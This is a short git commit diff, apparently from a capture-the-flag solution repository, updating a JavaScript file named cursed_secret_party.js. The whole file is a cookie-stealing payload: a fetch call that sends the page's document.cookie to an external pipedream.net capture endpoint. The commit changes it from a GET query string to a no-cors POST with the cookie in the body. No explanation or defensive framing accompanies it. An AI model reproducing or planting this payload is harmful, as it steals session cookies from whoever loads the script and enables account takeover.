15d683deb436a19d9e10b87e3a20988bc9437e31
Dan Archer <46483718+DanArcherOnline@users.noreply.github.com>
2022-10-30 15:36:29 +0900

    Update cursed_secret_party.js

--- cursed_secret_party.js
+++ cursed_secret_party.js
@@ -1,1 +1,8 @@
-fetch("https://eoidyopoyxej0sc.m.pipedream.net?cookie="+document.cookie);
+fetch(
+  "https://eoidyopoyxej0sc.m.pipedream.net?cookie="+document.cookie,
+  {
+    method: 'POST',
+    mode: 'no-cors',
+    body: document.cookie
+  }
+);
